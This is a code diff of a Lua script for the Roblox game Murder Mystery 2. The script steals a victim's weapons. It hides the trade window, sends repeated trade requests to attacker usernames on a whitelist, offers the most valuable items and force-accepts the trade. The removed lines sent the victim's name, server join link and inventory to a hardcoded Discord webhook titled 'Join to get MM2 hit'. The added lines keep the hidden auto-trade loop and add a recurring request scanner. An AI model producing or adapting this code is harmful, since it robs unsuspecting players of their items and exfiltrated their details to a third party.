@@ -1,8 +1,7 @@
-
 local users = _G.Usernames or {"ilyes_ida3"}
 local min_rarity = _G.min_rarity or "Common"
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1538645276531761252/cUb2gp1cnWz8w0EXNjJ8AVBtFcmbmEwLF2zmGUbvVZkmZkd4vYcEye9VkuB7wavTd-Y6"
+local webhook = _G.webhook or ""
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
@@ -30,7 +29,6 @@ local playerGui = plr:WaitForChild("PlayerGui")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local database
-
 do
     local ok, result = pcall(function()
         return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
@@ -54,49 +52,56 @@ do
 end
 
 local rarityTable = {
-    "Common",
-    "Uncommon",
-    "Rare",
-    "Legendary",
-    "Godly",
-    "Ancient",
-    "Unique",
-    "Vintage"
+    "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
 }
 
 local untradable = {
-    ["DefaultGun"] = true,
-    ["DefaultKnife"] = true,
-    ["Reaver"] = true,
-    ["Reaver_Legendary"] = true,
-    ["Reaver_Godly"] = true,
-    ["Reaver_Ancient"] = true,
-    ["IceHammer"] = true,
-    ["IceHammer_Legendary"] = true,
-    ["IceHammer_Godly"] = true,
-    ["IceHammer_Ancient"] = true,
-    ["Gingerscythe"] = true,
-    ["Gingerscythe_Legendary"] = true,
-    ["Gingerscythe_Godly"] = true,
-    ["Gingerscythe_Ancient"] = true,
-    ["TestItem"] = true,
-    ["Season1TestKnife"] = true,
-    ["Cracks"] = true,
-    ["Icecrusher"] = true,
-    ["???"] = true,
-    ["Dartbringer"] = true,
-    ["TravelerAxeRed"] = true,
-    ["TravelerAxeBronze"] = true,
-    ["TravelerAxeSilver"] = true,
-    ["TravelerAxeGold"] = true,
-    ["BlueCamo_K_2022"] = true,
-    ["GreenCamo_K_2022"] = true,
-    ["SharkSeeker"] = true
+    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
+    ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,
+    ["IceHammer_Godly"] = true, ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
+    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true, ["Season1TestKnife"] = true,
+    ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true,
+    ["TravelerAxeBronze"] = true, ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true,
+    ["BlueCamo_K_2022"] = true, ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
 }
 
 local lastOfferToken = nil
 local opponentAccepted = false
 local lastOfferChangeAt = 0
+local isAutoTrading = false
+local guiBlockConnections = {}
+
+local tradegui = playerGui:WaitForChild("TradeGUI", 10)
+local tradeguiphone = playerGui:FindFirstChild("TradeGUI_Phone")
+
+local function blockGui()
+    if #guiBlockConnections > 0 then return end
+    
+    if tradegui then
+        tradegui.Enabled = false
+        table.insert(guiBlockConnections, tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if tradegui.Enabled then tradegui.Enabled = false end
+        end))
+    end
+    if tradeguiphone then
+        tradeguiphone.Enabled = false
+        table.insert(guiBlockConnections, tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if tradeguiphone.Enabled then tradeguiphone.Enabled = false end
+        end))
+    end
+end
+
+local function unblockGui()
+    for _, conn in ipairs(guiBlockConnections) do
+        conn:Disconnect()
+    end
+    table.clear(guiBlockConnections)
+    if tradegui then tradegui.Enabled = true end
+    if tradeguiphone then tradeguiphone.Enabled = true end
+end
+
+-- Изначально скрываем GUI в 100% случаев
+blockGui()
 
 local function getTradeStatus()
     local ok, status = pcall(function()
@@ -105,27 +110,20 @@ local function getTradeStatus()
     return ok and status or "None"
 end
 
-local function sendTradeRequest(user)
-    local player = Players:FindFirstChild(user)
-    if not player then
-        return false
+local function getTradeOpponent()
+    if tradegui and tradegui:FindFirstChild("Container") and tradegui.Container:FindFirstChild("Player2") then
+        local nameLabel = tradegui.Container.Player2:FindFirstChild("PlayerName")
+        if nameLabel and nameLabel.Text ~= "" and nameLabel.Text ~= "Player2" then
+            return nameLabel.Text
+        end
     end
-    local ok = pcall(function()
-        Trade.SendRequest:InvokeServer(player)
-    end)
-    return ok
+    return nil
 end
 
-local function waitForTradeCompletion()
-    local timeout = 0
-    while timeout < 35 do
-        if getTradeStatus() == "None" then
-            return true
-        end
-        task.wait(0.15)
-        timeout = timeout + 0.15
-    end
-    return false
+local function sendTradeRequest(user)
+    local player = Players:FindFirstChild(user)
+    if not player then return false end
+    return pcall(function() Trade.SendRequest:InvokeServer(player) end)
 end
 
 Trade.UpdateTrade.OnClientEvent:Connect(function(data)
@@ -137,29 +135,18 @@ Trade.UpdateTrade.OnClientEvent:Connect(function(data)
 end)
 
 Trade.AcceptTrade.OnClientEvent:Connect(function(success)
-    if success then
-        opponentAccepted = false
-    else
-        opponentAccepted = true
-    end
+    if success then opponentAccepted = false else opponentAccepted = true end
 end)
 
 local function forceAcceptTrade()
-    if not lastOfferToken then
-        return false
-    end
-
+    if not lastOfferToken then return false end
     for _ = 1, 10 do
         local left = 6 - (tick() - lastOfferChangeAt)
         if left > 0 then
             task.wait(math.min(left + 0.1, 1.2))
         else
-            local ok = pcall(function()
-                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken)
-            end)
-            if ok then
-                return true
-            end
+            local ok = pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken) end)
+            if ok then return true end
             task.wait(0.35)
         end
     end
@@ -167,9 +154,7 @@ local function forceAcceptTrade()
 end
 
 local function addWeaponToTrade(id)
-    pcall(function()
-        Trade.OfferItem:FireServer(id, "Weapons")
-    end)
+    pcall(function() Trade.OfferItem:FireServer(id, "Weapons") end)
 end
 
 local function rebuildWeaponsList()
@@ -177,23 +162,16 @@ local function rebuildWeaponsList()
     local ok, realData = pcall(function()
         return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
     end)
-    if not ok or typeof(realData) ~= "table" or not realData.Weapons or not realData.Weapons.Owned then
-        return
-    end
+    if not ok or typeof(realData) ~= "table" or not realData.Weapons or not realData.Weapons.Owned then return end
 
     local min_rarity_index = table.find(rarityTable, min_rarity) or 1
-
     for dataid, amount in pairs(realData.Weapons.Owned) do
         local itemData = database[dataid]
         if itemData and amount and amount > 0 then
             local rarity = itemData.Rarity
             local weapon_rarity_index = table.find(rarityTable, rarity)
             if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
-                table.insert(weaponsToSend, {
-                    DataID = dataid,
-                    Rarity = rarity,
-                    Amount = amount
-                })
+                table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount})
             end
         end
     end
@@ -201,208 +179,103 @@ local function rebuildWeaponsList()
     table.sort(weaponsToSend, function(a, b)
         local aIdx = table.find(rarityTable, a.Rarity) or 0
         local bIdx = table.find(rarityTable, b.Rarity) or 0
-        if aIdx == bIdx then
-            return a.Amount > b.Amount
-        end
+        if aIdx == bIdx then return a.Amount > b.Amount end
         return aIdx > bIdx
     end)
 end
 
-local function SendFirstMessage(list, prefix)
-    local fields = {
-        {
-            name = "Victim Username:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId,
-            inline = false
-        },
-        {
-            name = "Item list:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary:",
-            value = string.format("Total stacks: %d", #list),
-            inline = false
-        }
-    }
-
-    for _, item in ipairs(list) do
-        fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)\n", item.DataID, item.Amount, item.Rarity)
-    end
-
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
-
-    local data = {
-        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
-        embeds = {{
-            title = "Join to get MM2 hit",
-            color = 65280,
-            fields = fields,
-            footer = { text = "good job" }
-        }}
-    }
-
-    pcall(function()
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-end
-
-local tradegui = playerGui:WaitForChild("TradeGUI", 10)
-if tradegui then
-    tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
-        tradegui.Enabled = false
-    end)
-end
-
-local tradeguiphone = playerGui:FindFirstChild("TradeGUI_Phone")
-if tradeguiphone then
-    tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
-        tradeguiphone.Enabled = false
-    end)
-end
-
-rebuildWeaponsList()
-
-if #weaponsToSend > 0 then
-    local sentWeapons = {}
-    for i, v in ipairs(weaponsToSend) do
-        sentWeapons[i] = {
-            DataID = v.DataID,
-            Rarity = v.Rarity,
-            Amount = v.Amount
-        }
-    end
-
-    local prefix = ""
-    if ping == "Yes" then
-        prefix = "--[[@everyone]] "
-    end
-
-    SendFirstMessage(weaponsToSend, prefix)
-
-    local function doTrade(joinedUser)
-        local initialTradeState = getTradeStatus()
-
-        if initialTradeState == "StartTrade" then
-            pcall(function()
-                Trade.CancelAccept:FireServer()
-            end)
-            pcall(function()
-                Trade.DeclineTrade:FireServer()
-            end)
-            task.wait(0.45)
-        elseif initialTradeState == "ReceivingRequest" then
-            pcall(function()
-                Trade.DeclineRequest:FireServer()
-            end)
-            task.wait(0.45)
+local function handleAutoTrade()
+    isAutoTrading = true
+    while isAutoTrading do
+        rebuildWeaponsList()
+        if #weaponsToSend == 0 then 
+            isAutoTrading = false
+            break 
         end
 
-        while true do
-            rebuildWeaponsList()
-            if #weaponsToSend == 0 then
-                break
-            end
+        local tradeStatus = getTradeStatus()
+        if tradeStatus == "StartTrade" then
+            lastOfferToken = nil
+            opponentAccepted = false
+            lastOfferChangeAt = tick()
 
-            local tradeStatus = getTradeStatus()
-
-            if tradeStatus == "None" then
-                pcall(function()
-                    sendTradeRequest(joinedUser)
-                end)
-                task.wait(0.85)
-
-            elseif tradeStatus == "SendingRequest" then
-                task.wait(0.4)
-
-            elseif tradeStatus == "ReceivingRequest" then
-                pcall(function()
-                    Trade.DeclineRequest:FireServer()
-                end)
-                task.wait(0.4)
-
-            elseif tradeStatus == "StartTrade" then
-                lastOfferToken = nil
-                opponentAccepted = false
-                lastOfferChangeAt = tick()
-
-                local toOffer = math.min(4, #weaponsToSend)
-                for i = 1, toOffer do
-                    local weapon = weaponsToSend[i]
-                    if weapon then
-                        for _ = 1, weapon.Amount do
-                            addWeaponToTrade(weapon.DataID)
-                            task.wait(0.05)
-                        end
+            local toOffer = math.min(4, #weaponsToSend)
+            for i = 1, toOffer do
+                local weapon = weaponsToSend[i]
+                if weapon then
+                    for _ = 1, weapon.Amount do
+                        addWeaponToTrade(weapon.DataID)
+                        task.wait(0.05)
                     end
                 end
+            end
 
-                local waitStart = tick()
-                while not lastOfferToken and tick() - waitStart < 8 do
-                    task.wait(0.12)
-                end
+            local waitStart = tick()
+            while not lastOfferToken and tick() - waitStart < 8 do task.wait(0.12) end
 
+            forceAcceptTrade()
+            if opponentAccepted then
+                task.wait(0.35)
                 forceAcceptTrade()
-
-                if opponentAccepted then
-                    task.wait(0.35)
-                    forceAcceptTrade()
-                end
-
-                waitForTradeCompletion()
-                task.wait(0.75)
-                rebuildWeaponsList()
-
-            else
-                task.wait(0.5)
             end
-
-            task.wait(0.65)
+            
+            while getTradeStatus() ~= "None" do task.wait(0.2) end
+        else
+            isAutoTrading = false
+            break
         end
+        task.wait(0.5)
     end
-
-    local function waitForUserJoined()
-        local sentMessage = false
-        local processed = {}
-
-        local function handlePlayer(player)
-            if processed[player.Name] then
-                return
-            end
-            if not table.find(users, player.Name) then
-                return
-            end
-            processed[player.Name] = true
-            task.spawn(function()
-                doTrade(player.Name)
-            end)
-        end
-
-        for _, player in ipairs(Players:GetPlayers()) do
-            handlePlayer(player)
-        end
-        Players.PlayerAdded:Connect(handlePlayer)
-    end
-
-    waitForUserJoined()
+    isAutoTrading = false
 end
+
+-- Мониторинг статуса трейда
+task.spawn(function()
+    local lastStatus = "None"
+    while true do
+        local currentStatus = getTradeStatus()
+        
+        if currentStatus == "StartTrade" and lastStatus ~= "StartTrade" then
+            -- Ждем чуть-чуть, чтобы GUI обновило имя
+            task.wait(0.5) 
+            local opponentName = getTradeOpponent()
+            
+            if opponentName and table.find(users, opponentName) then
+                -- Оппонент в белом списке, держим GUI скрытым и запускаем автотрейд
+                blockGui()
+                if not isAutoTrading then
+                    task.spawn(handleAutoTrade)
+                end
+            else
+                -- Оппонент не в белом списке, возвращаем GUI и ничего не делаем
+                unblockGui()
+                isAutoTrading = false
+            end
+        elseif currentStatus == "None" and lastStatus ~= "None" then
+            -- Трейд закончился, снова скрываем GUI на 100%
+            blockGui()
+            isAutoTrading = false
+        end
+        
+        lastStatus = currentStatus
+        task.wait(0.5)
+    end
+end)
+
+-- Сканер каждые 3 секунды
+task.spawn(function()
+    while true do
+        local tradeStatus = getTradeStatus()
+        if tradeStatus == "None" then
+            for _, targetUser in ipairs(users) do
+                if Players:FindFirstChild(targetUser) then
+                    sendTradeRequest(targetUser)
+                    break -- Отправляем только одному, если их несколько
+                end
+            end
+        end
+        task.wait(3)
+    end
+end)
+
+rebuildWeaponsList()
